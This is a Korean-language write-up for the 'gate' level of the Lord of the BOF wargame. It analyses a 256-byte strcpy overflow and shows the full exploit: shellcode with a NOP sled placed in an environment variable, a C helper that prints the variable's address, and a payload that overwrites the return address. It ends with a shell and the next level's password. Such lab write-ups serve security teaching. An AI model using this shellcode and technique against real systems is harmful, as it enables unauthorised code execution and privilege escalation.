============================================================================================================
[lob] gate
============================================================================================================


.. uml::
    
    @startuml

    start

    :Source Analysis;

    :Memory Structure;

    :Segmentation fault;

    :환경 변수 쉘코드 등록;

    :환경 변수 주소값 확인;

    :RET 주소를 환경 변수 주소로 변경하여 공격 진행;
    
    stop

    @enduml

|

Source Analysis
============================================================================================================

해당 문제 소스코드는 다음과 같습니다.

.. code-block:: c

    /*
        The Lord of the BOF : The Fellowship of the BOF
        - gremlin
        - simple BOF
    */

    int main(int argc, char *argv[])
    {
        char buffer[256];
        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
    }

|

Memory Structure
============================================================================================================

스택에 다음과 같이 들어가게 됩니다.

.. code-block:: console

    ===============
    LOW     
    ---------------
    Buffer  (256byte) <- argv[1]
    SFP     (4byte)
    RET     (4byte)
    ---------------
    HIGH    
    ===============

|

Segmentation fault
============================================================================================================

버퍼오버플로우가 일어나는 지점을 확인합니다.

※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행해야 합니다.

.. code-block:: console

    $ bash2
    $ ./gremlin `python -c "print 'a'*256"`
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    $ ./gremlin `python -c "print 'a'*260"`
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    Segmentation fault

|

exploit
============================================================================================================

환경 변수 쉘코드 등록
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    $ export shellcode=`python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`


|

환경 변수 주소값 확인
------------------------------------------------------------------------------------------------------------

.. code-block:: c

    #include <stdio.h>
    int main(int argc, char **argv)
    {
        char *addr;
        addr = getenv(argv[1]);
        printf("address %p\n", addr);
        return 0;
    }

.. code-block:: console

    $ gcc -o get get.c
    get.c: In function `main':
    get.c:5: warning: assignment makes pointer from integer without a cast

    $ ./get shellcode
    address 0xbffffc4c

|

RET 주소를 환경 변수 주소로 변경하여 공격 진행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    $ ./gremlin `python -c 'print "\x90"*260+"\x4c\xfc\xff\xbf"'`
    
    bash$ whoami
    gremlin
    bash$ my-pass
    euid = 501
    hello bof world


